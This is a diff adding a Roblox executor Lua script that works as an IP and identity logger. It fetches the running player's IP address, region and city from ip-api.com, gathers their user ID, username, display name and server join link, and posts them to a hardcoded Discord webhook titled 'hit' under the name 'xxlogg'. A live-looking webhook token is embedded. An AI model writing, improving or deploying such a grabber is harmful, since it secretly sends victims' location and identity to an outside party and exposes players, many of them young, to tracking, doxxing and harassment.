@@ -1,0 +1,51 @@
+local WEBHOOK = "https://discord.com/api/webhooks/1555954383643087051/ZFtZWovVEV9Tv0Afh32BU6A_8W0PXHkZOh3Opo4EmpZR9lexmAk7QGgsrxp__QFywL-y"
+
+local Players = game:GetService("Players")
+local Http = game:GetService("HttpService")
+local lp = Players.LocalPlayer
+
+local function getIP()
+    local ok, r = pcall(function()
+        return request({Url="http://ip-api.com/json/?lang=ja", Method="GET"})
+    end)
+    if ok and r and (r.Body or r.body) then
+        local ok2, d = pcall(function() return Http:JSONDecode(r.Body or r.body) end)
+        if ok2 and d and d.status == "success" then
+            return d.query .. " / " .. (d.regionName or "?") .. " / " .. (d.city or "?")
+        end
+    end
+    return "n/a"
+end
+
+local function getJoinLink()
+    local jid = game.JobId
+    if jid == nil or jid == "" then return "n/a" end
+    return "https://www.roblox.com/games/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jid
+end
+
+local payload = {
+    username = "xxlogg",
+    embeds = {{
+        title = "hit",
+        color = 0x2b2d31,
+        fields = {
+            {name="IP / 地域",  value=getIP(),                       inline=false},
+            {name="UserID",     value=tostring(lp.UserId),           inline=true},
+            {name="Username",   value=lp.Name,                       inline=true},
+            {name="Display",    value=lp.DisplayName,                inline=true},
+            {name="参加リンク",  value=getJoinLink(),                 inline=false},
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+    }}
+}
+
+local ok, r = pcall(function()
+    return request({
+        Url = WEBHOOK,
+        Method = "POST",
+        Headers = {["Content-Type"]="application/json"},
+        Body = Http:JSONEncode(payload),
+    })
+end)
+
+if ok then print("sent") else print("fail:", r) end
